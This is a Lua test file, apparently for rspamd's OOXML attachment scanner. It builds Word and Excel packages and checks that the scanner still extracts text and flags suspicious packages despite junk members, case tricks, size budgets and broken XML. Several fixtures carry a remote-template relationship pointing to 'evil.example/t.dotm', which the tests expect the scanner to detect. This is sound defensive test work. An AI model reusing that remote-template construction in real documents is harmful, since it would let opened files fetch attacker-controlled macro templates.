-- Packages that the applications open and that must not hide their content

context("OOXML packages that applications open", function()
  local archive = require "archive"
  local ooxml = require "lua_content/ooxml"
  local lua_content = require "lua_content"
  local rspamd_task = require "rspamd_task"
  local rspamd_util = require "rspamd_util"

  local rel_ns = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
  local pkg_ns = "http://schemas.openxmlformats.org/package/2006/relationships"
  local w_ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
  local s_ns = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
  local word_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
  local sheet_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"

  local function content_types(part, ctype)
    return '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' ..
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' ..
        '<Default Extension="xml" ContentType="application/xml"/>' ..
        '<Override PartName="' .. part .. '" ContentType="' .. ctype .. '"/></Types>'
  end

  local function rels(list)
    local out = { '<Relationships xmlns="' .. pkg_ns .. '">' }
    for i, r in ipairs(list) do
      out[#out + 1] = string.format('<Relationship Id="r%d" Type="%s%s" Target="%s"%s/>', i, rel_ns, r[1], r[2],
          r[3] and ' TargetMode="External"' or '')
    end
    out[#out + 1] = '</Relationships>'
    return table.concat(out)
  end

  local function paragraph(text)
    return '<w:p><w:r><w:t>' .. text .. '</w:t></w:r></w:p>'
  end

  local function word_document(body)
    return '<w:document ' .. w_ns .. '><w:body>' .. body .. '</w:body></w:document>'
  end

  local template_rels = rels({ { 'attachedTemplate', 'https://evil.example/t.dotm', true } })

  -- A document with a remote template; `opts` changes the pieces under test
  local function docx(opts)
    opts = opts or {}
    local files = {}
    for i = 1, opts.junk or 0 do
      files[#files + 1] = { name = "customXml/item" .. i, content = "x" }
    end
    files[#files + 1] = { name = "[Content_Types].xml", content = content_types('/word/document.xml', word_type) }
    files[#files + 1] = { name = "_rels/.rels",
                          content = rels({ { 'officeDocument', opts.main_target or 'word/document.xml' } }) }
    files[#files + 1] = { name = opts.rels_name or "word/_rels/document.xml.rels",
                          content = opts.rels or template_rels }
    files[#files + 1] = { name = opts.main_name or "word/document.xml",
                          content = opts.document or word_document(paragraph('visible text')) }
    for _, f in ipairs(opts.files or {}) do
      files[#files + 1] = f
    end
    return archive.zip(files)
  end

  local function message(ctype, fname, data)
    return table.concat({ "From: a@example.com", "To: b@example.com", "Subject: t", "MIME-Version: 1.0",
                          'Content-Type: multipart/mixed; boundary="B"', "", "--B", "Content-Type: text/plain", "",
                          "hello", "--B",
                          "Content-Type: " .. ctype .. '; name="' .. fname .. '"',
                          'Content-Disposition: attachment; filename="' .. fname .. '"',
                          "Content-Transfer-Encoding: base64", "",
                          tostring(rspamd_util.encode_base64(tostring(data), 76)), "--B--", "" }, "\r\n")
  end

  -- What the handlers have left on the attachment of a message
  local function scan(ctype, fname, data)
    local ok, task = rspamd_task.load_from_string(message(ctype, fname, data), rspamd_config)
    if not ok then
      error('cannot load the message')
    end
    task:process_message()
    local res

    for _, p in ipairs(task:get_parts()) do
      if p:get_filename() == fname then
        local sp = lua_content.get_specific(p, task)
        res = {
          ext = p:get_detected_ext(),
          tag = sp and sp.tag,
          suspicious = sp and sp.suspicious,
          reason = sp and sp.reason,
          remote_template = sp and sp.relationships and sp.relationships.remote_template,
          text = sp and sp.text and tostring(sp.text),
        }
      end
    end

    task:destroy()
    return res
  end

  -- Detection

  for _, junk in ipairs({ 0, 99, 100, 300 }) do
    test(string.format("A document is detected after %d other members", junk), function()
      local res = scan("application/octet-stream", "a.docx", docx({ junk = junk }))
      assert_equal('docx', res.ext)
      assert_equal('docx', res.tag)
      assert_equal('https://evil.example/t.dotm', res.remote_template)
    end)
  end

  test("An archive named as a document goes to the handler of documents", function()
    -- No part of a package: only the name says what it claims to be
    local data = archive.zip({ { name = "readme.txt", content = "hello" } })
    local res = scan("application/octet-stream", "a.docx", data)
    assert_equal('docx', res.tag)
    assert_true(res.suspicious)
    assert_equal('package', res.reason)

    res = scan("application/octet-stream", "a.zip", data)
    assert_nil(res.tag)
  end)

  -- Names of the parts

  test("A relationship target that is a part name is followed", function()
    local package, err = ooxml.open(docx({ main_target = '/word/document.xml' }))
    assert_not_nil(package, err)
    assert_equal('word/document.xml', package.main_part)
  end)

  test("Part names are matched without regard to the case", function()
    local package, err = ooxml.open(docx({ main_name = 'Word/Document.XML',
                                           rels_name = 'WORD/_rels/document.xml.RELS' }))
    assert_not_nil(package, err)
    local extracted
    extracted, err = ooxml.extract(package)
    assert_not_nil(extracted, err)
    assert_not_nil(tostring(extracted.text):find('visible text', 1, true))
    assert_equal('https://evil.example/t.dotm', ooxml.summarize_relationships(package).remote_template)
  end)

  test("Two parts that differ by the case only are refused", function()
    local package = ooxml.open(docx({ files = { { name = 'Word/Document.xml', content = '<x/>' } } }))
    assert_nil(package)
  end)

  test("archive.unpack matches names without regard to the case on request", function()
    local zip = archive.zip({ { name = 'Dir/File.TXT', content = 'hello' } })
    assert_equal(0, #archive.unpack(zip, 'zip', nil, { files = { 'dir/file.txt' } }))
    local files = archive.unpack(zip, 'zip', nil, { files = { 'dir/file.txt' }, ignore_case = true })
    assert_equal(1, #files)
    assert_equal('Dir/File.TXT', files[1].name)
  end)

  -- Budgets

  test("The entries of a package are counted once, not once per pass", function()
    local package, err = ooxml.open(docx({ junk = 5000 }))
    assert_not_nil(package, err)
    assert_equal(5004, package.archive_entries)

    package = ooxml.open(docx({ junk = 12000 }))
    assert_nil(package)
  end)

  test("What is known of a package that fails to open is kept", function()
    -- The main part is not there, the relationships of it are
    local data = archive.zip({
      { name = "[Content_Types].xml", content = content_types('/word/document.xml', word_type) },
      { name = "_rels/.rels", content = rels({ { 'officeDocument', 'word/document.xml' } }) },
      { name = "word/_rels/document.xml.rels", content = template_rels },
    })
    local package, err, partial = ooxml.open(data)
    assert_nil(package)
    assert_not_nil(err)
    assert_equal('https://evil.example/t.dotm', ooxml.summarize_relationships(partial).remote_template)

    local res = scan("application/vnd.openxmlformats-officedocument.wordprocessingml.document", "a.docx", data)
    assert_true(res.suspicious)
    assert_equal('https://evil.example/t.dotm', res.remote_template)
  end)

  local function xlsx(nsheets)
    local workbook_rels = {}
    local files = {
      { name = "[Content_Types].xml", content = content_types('/xl/workbook.xml', sheet_type) },
      { name = "_rels/.rels", content = rels({ { 'officeDocument', 'xl/workbook.xml' } }) },
      { name = "xl/workbook.xml", content = '<workbook ' .. s_ns .. '/>' },
    }
    for i = 1, nsheets do
      workbook_rels[i] = { 'worksheet', string.format('worksheets/sheet%d.xml', i) }
      files[#files + 1] = { name = string.format('xl/worksheets/sheet%d.xml', i),
                            content = '<worksheet ' .. s_ns .. '><sheetData/></worksheet>' }
    end
    workbook_rels[#workbook_rels + 1] = { 'sharedStrings', 'sharedStrings.xml' }
    files[#files + 1] = { name = "xl/sharedStrings.xml",
                          content = '<sst ' .. s_ns .. '><si><t>Important shared text</t></si></sst>' }
    files[#files + 1] = { name = "xl/_rels/workbook.xml.rels", content = rels(workbook_rels) }
    return archive.zip(files)
  end

  test("Empty sheets listed first do not hide the shared strings", function()
    for _, n in ipairs({ 10, 70, 200 }) do
      local package, err = ooxml.open(xlsx(n))
      assert_not_nil(package, err)
      assert_nil(package.truncated)
      local extracted
      extracted, err = ooxml.extract(package)
      assert_not_nil(extracted, err)
      assert_not_nil(tostring(extracted.text):find('Important shared text', 1, true), n .. ' sheets')
    end

    -- Past the budget of parts the strings are still there, and it is told
    local package = ooxml.open(xlsx(700))
    assert_not_nil(package)
    assert_true(package.truncated)
    local extracted = ooxml.extract(package)
    assert_not_nil(tostring(extracted.text):find('Important shared text', 1, true))
  end)

  -- XML that an application reads

  test("A name outside of ASCII and a DEL character do not fail a document", function()
    local package, err = ooxml.open(docx({
      document = word_document(paragraph('before') .. '<données attribut\195\169="1"/>' ..
          paragraph('with\127del') .. paragraph('after')),
    }))
    assert_not_nil(package, err)
    local extracted
    extracted, err = ooxml.extract(package)
    assert_not_nil(extracted, err)
    local text = tostring(extracted.text)
    assert_not_nil(text:find('before', 1, true))
    assert_not_nil(text:find('after', 1, true))
    assert_nil(extracted.failed_stories)
  end)

  test("A part that cannot be parsed does not take the others away", function()
    local package, err = ooxml.open(docx({
      rels = rels({ { 'header', 'header1.xml' }, { 'footer', 'footer1.xml' } }),
      files = {
        { name = 'word/header1.xml', content = '<w:hdr ' .. w_ns .. '>' .. paragraph('header text') .. '<broken' },
        { name = 'word/footer1.xml', content = '<w:ftr ' .. w_ns .. '>' .. paragraph('footer text') .. '</w:ftr>' },
      },
    }))
    assert_not_nil(package, err)
    local extracted
    extracted, err = ooxml.extract(package)
    assert_not_nil(extracted, err)
    local text = tostring(extracted.text)
    assert_not_nil(text:find('visible text', 1, true))
    assert_not_nil(text:find('footer text', 1, true))
    assert_equal(1, extracted.failed_stories)
  end)

  test("A document of which nothing can be parsed is an error", function()
    local package, err = ooxml.open(docx({ document = '<w:document ' .. w_ns .. '><broken' }))
    assert_not_nil(package, err)
    local extracted
    extracted, err = ooxml.extract(package)
    assert_nil(extracted)
    assert_not_nil(err)
  end)
end)
